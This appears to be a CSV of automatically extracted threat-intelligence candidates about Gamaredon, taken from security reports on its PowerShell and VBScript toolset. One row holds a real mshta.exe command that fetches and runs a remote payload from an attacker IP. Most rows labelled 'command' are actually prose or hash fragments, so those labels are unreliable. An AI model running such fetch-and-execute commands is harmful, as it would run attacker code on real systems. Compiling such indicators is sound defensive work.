schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--gamaredon,artifact--sha256:38cd6ce41360920ae87cec82491bbe1a3e75384bb4f561c0657a409c5947e500,observation--sha256:c0acb2697e53ff13a7acd4c28b88beea2a7d02747a5c4ff6b176ee98e7284b57,command,"%APPDATA%\Nitro\<randomFilename> , which executes a PowerShell command reading, concatenating,","%APPDATA%\Nitro\<randomFilename> , which executes a PowerShell command reading, concatenating",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"19 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Downloader of PteroPSDoor variant 2 We know about two versions of the downloader that deploys PteroPSDoor variant 2 . Their functionality is similar, but the older one is a VBScript with an embedded PowerShell command line, while the newer one is a PowerShell script encapsulated in a VBScript. The older version uses the URI /new and comprises two parts. The first part executes a brief PowerShell comm",
1.0.0,actor--gamaredon,artifact--sha256:3defe1ffedc5ba9b072c41d2fb6c038171f73da301bc0ad4b8b7e73ef6b06647,observation--sha256:b7d723ff5f7b6f10603d03189f68be1a3879259d33ac834a381c7ccb56afc343,command,"%COMPUTERNAME%a [sic] under the HKCU Run key. Both methods run a PowerShell loader, which is stor ed as","%COMPUTERNAME%a [sic] under the HKCU Run key. Both methods run a PowerShell loader, which is stor ed as",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"21 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances described in detail in our Gamaredon 2024 white paper. That version was being used without notable updates until March 23rd, 2025, when it was replaced with a new version. Two days later , 2025, we discovered this updated version, now featuring additional obfuscation and an empty URI path in HTTP requests. Lacking a unique URI, on which we based our naming of all the previous versions , we named it version 13, as it",
1.0.0,actor--gamaredon,artifact--sha256:c8f5ae424932d61c2edb50134493050f95c941cc6d0e2f1a5bc09dc4fef5e449,observation--sha256:1cb8ca7e0d0cabbef13348d0edc6bfb885ecc33a6994e4d10cb8bcdf5402cfbb,command,%windir%\system32\mshta.exe http://194.180.174[.]203/23.01/mo/baseball[.]DjVu,%windir%\system32\mshta.exe http://194.180.174.203/23.01/mo/baseball.DjVu,candidate,,unknown,unknown,not-stated,,source--gamaredon--a0d52e16421d8b11,Gamaredon/Beyond_Bullets_and_Bombs_An_Examination_of_Armageddon_Groups_Cyber.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Beyond Bullets and Bombs: An Examination of Armageddon Group's Cyber Warfare Against Ukraine 9 %windir%\system32\mshta.exe http://194.180.174[.]203/23.01/mo/baseball[.]DjVu MITRE ATT&CK TECHNIQUE NAME TECHNIQUE ID Spearphishing Attachment T1566.001 User Execution T1204.002 System Binary Proxy Execution: Mshta T1218.005 Defense Evasion Abusing Telegram to Bypass DNS Generally in the second stage, a malicious VBScript is used then they abuse Telegram to get the real C2 IP address. For example http",
1.0.0,actor--gamaredon,artifact--sha256:a1effa300a9a968d58305f6a125c0910da242bbd1f7585359616a468412cc63a,observation--sha256:8209d255b5f26048a068b7ccb3ec0f4fa6e916645cb677193ce9cebdc99ffb69,command,- checking the mshta.exe process in the list of running,- checking the mshta.exe process in the list of running,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Figure 13. Resolving domain to IP It should be noted that the new file has the same name and location as the previous one, so it checks its existence before code will be written. If present, the previous file is deleted. The same names are misleading because the contents of all the files are different. The analysis of other scripts revealed the following additional functionality: - checking the mshta.exe process in the list of running processes and terminating it; - suspending its work for some ",
1.0.0,actor--gamaredon,artifact--sha256:85376e69f7f6f4ad0ee7b664cdf87abff1e6e30d4fc516c5c6412cad1e3204c3,observation--sha256:2a092e54f6180d79eea5307a9d0f30005215443a4a4fb462c183670ec5bae10e,command,"/power.php ) as an intermediate stage, which can receive either a PowerShell command or a VBScript","/power.php ) as an intermediate stage, which can receive either a PowerShell command or a VBScript",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"22 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroLNK is obfuscated in multiple layers, detailed in the Obfuscation section. The obfuscation applied to the scheduler component, where selected characters are replaced with random sequences, is also used on code blocks embedded as base64 -encoded blobs. Nearly all strin g variables and small code blocks are divided into smaller parts and then concatenated before use or execution. Additionally, fun",
1.0.0,actor--gamaredon,artifact--sha256:cb71f6cf5e9e6166cedacc8e20f549c3eb55701ade6c10c690d22c4f4af2c10b,observation--sha256:e0682df5803e028bad9c60b19926bddf1d55a73d80a115ad2b43241d47b25af8,command,.001 PowerShell Group executes ps1 scripts in system,001 PowerShell Group executes ps1 scripts in system,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 34}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Techniques used in cyberattack (according to MITRE ATT & CK Matrix) Tactics ID Name Description Initial Access T1566 .001 Spearphishing Attachment Group sends spear phishing emails with malicious attachments or links .002 Spearphishing Link Execution T1059 .001 PowerShell Group executes ps1 scripts in system .005 Visual Basic Group executes numerous vbs scripts in system T1053 .005 Scheduled Task Group sets up scheduled tasks to launch scripts and downloaded tasklist T1047 WMI Group uses WMI com,
1.0.0,actor--gamaredon,artifact--sha256:2bbe757aea494f0ceb77670454a39735bd6c7d55116098dad98339a983b767ef,observation--sha256:3b124a01d01d9e599e974a292281e36cd8e4995d5a90369988c33588520ac16a,command,0141C1E1888F433B5342 N/A PowerShell/Pterodo.WO PteroPSDoor version 1000.,0141C1E1888F433B5342 N/A PowerShell/Pterodo.WO PteroPSDoor version 1000,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances After a break in January 2025, Gamaredon resumed running frequent spearphishing campaigns, with notably higher activity in the second half of the year , during which Gamaredon also slightly tweaked its TTPs, and started exploiting a vulnerability affecting WinRAR ( CVE-2025-8088) to deploy its typical malicious HTA downloaders . Lastly, Gamaredon continued with its efforts to protect and hide its network infrastruct",
1.0.0,actor--gamaredon,artifact--sha256:a88a0f4b9681108d545397c5c847e1dedae991bb108948aa7444960fd4548b92,observation--sha256:8a8d63777c73c2033030f387ee3557f774be91d628d5208d0bfe852f9afb6d2f,command,09F3E1DD6C78D58D8E89 N/A PowerShell/Pterodo.FR PteroBleed – steals the IndexedDB,09F3E1DD6C78D58D8E89 N/A PowerShell/Pterodo.FR PteroBleed – steals the IndexedDB,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"39 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 IOCS Files In this section, w e only provide one example for each tool or variant . All IoCs were already provided in the MISP events published with private ESET Threat Intelligence reports throughout 2022 and 2023. SHA-1 Filename Detection Description DF1C0A70E7A02B839AB3 AAC3FC410E61EEFB58EB N/A VBS/Pterodo.AEV PteroX – a VBScript general -purpose downloader. B50F10BBDB49BE6D868B 09F3E1DD6C78D58D8E",
1.0.0,actor--gamaredon,artifact--sha256:ae85e969560715a948f7063afbf3d8bf616a9604c29566a030613e5012a82376,observation--sha256:5aaae9cd0741e595fbd884d0265fac16362b6b479c04f9680656aba95ef8d8ef,command,152B6A9148CD9D2F6662 N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell,152B6A9148CD9D2F6662 N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,41 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 025E3D88C53FC12D5A4A AB726E696F2815BAC84D N/A VBS/Pterodo.TX PteroPSLoad – PowerShell downloader. D5576E578518E474A5DF F654C44AB3EC4A6E4ECF N/A PowerShell/Pterodo.FD PteroPSLoad – PowerShell downloader. 28F4F0367C2BB0574C8A 7D1B9C3E71E6AC678300 N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell downloader. E0BD8855159CB708789C 4DE183E107C5C117FBA1 N/A PowerShell/P,
1.0.0,actor--gamaredon,artifact--sha256:dedbd240112ffe75c32487734353a511cc57c0623a062fc93d2b7d075321c2be,observation--sha256:ef34b1bdf9f5692f940befa0e5b0c1edb9e239f0028dcb5e1d8e0a3e5429f8e6,command,1CCED99B6DD4FEC6A3B N/A VBS/Pterodo.CEB PteroScout PowerShell version.,1CCED99B6DD4FEC6A3B N/A VBS/Pterodo.CEB PteroScout PowerShell version,candidate,2025-11-20T00:00:00Z,day,known,same-record,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"31 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances SHA -1 Filename Detection Description F718F25DCCF68BD7CB28A A7CB526FFA54B0E51A8 N/A PowerShell/TrojanDownloa der.Agent.LDD Downloader of PteroPSDoor. 09A22856890AB6AEF6311 CA2BD27BE54E86DA75C N/A PowerShell/Pterodo.QD PteroPSLoad – PowerShell downloader. 0F952E6162BCC881F7F84 4F3E2C7CDA9A5C74D72 N/A PowerShell/Pterodo.SU PteroPSLoad – PowerShell downloader. 61B03FF9D84EB653F9F66 867DBF76DFB1E130E93 N/A PowerShell/Pt",
